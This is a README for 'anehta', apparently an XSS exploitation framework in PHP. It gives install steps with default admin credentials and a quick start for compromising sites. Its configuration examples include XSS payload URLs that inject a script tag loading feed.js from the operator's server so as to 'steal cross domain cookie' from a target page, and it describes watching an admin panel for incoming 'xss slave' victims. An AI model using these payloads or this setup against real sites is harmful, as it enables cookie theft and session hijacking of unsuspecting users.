
=== Enviroment ===
1. PHP4/5 (PHP5 is recommended)
2. php.ini :: display_errors = Off;
2. Apache or IIS


=== Install & Configure ===
1. Decompress all the files in a directory on your server
2. Make sure your directories(and all the sub dirs) have the write permission.
3. Modify $U as username and $P as password in "server/class/auth_Class.php" file.
   Default username is "admin" and default password is "123456".
4. If you want to send mail, modify "server/mail.php" file to your own mail server or mailbox.


=== Quick Start ===
1. Login and turn to the Configure tab.
2. Input the "anehtaurl" as the url where your anehta is.
   For example: "http://www.a.com/anehta".
3. You should also input the boomerang src and boomerang target.
   boomerang src is usually the same page where you put your feed.js is.
   For example: boomerang src maybe: "http://www.b.com/xssed.html?param=<script src=http://www.a.com/anehta/feed.js></script>".

   boomerang target must be the page where you want to steal cross domain cookie.
   For example: boomerang target maybe: "http://www.alimafia.com/xssDemo.html#'><script src=http://www.a.com/anehta/feed.js></script><'".

   You can modify feed.js to cancel the xcookie module if you do not want to use boomerang.
   But you must always set boomerang src and target values when you modify in the configure tab.

4. After modified configure, simply load feed.js as a external script to where your xss page is.
   There is also a demo page in the directory which is "demo.html"

5. Refresh the admin.php, and you may see some changes if your xss slave coming.


=== More Support ===
Home page: http://anehta.googlecode.com
Blog: http://hi.baidu.com/aullik5  (Many Docs here)
Demo Video: http://hi.baidu.com/aullik5/blog/item/cb4cd5899283b093a4c272a9.html


Author: axis@ph4nt0m.org

Feel free to tell me your advise.


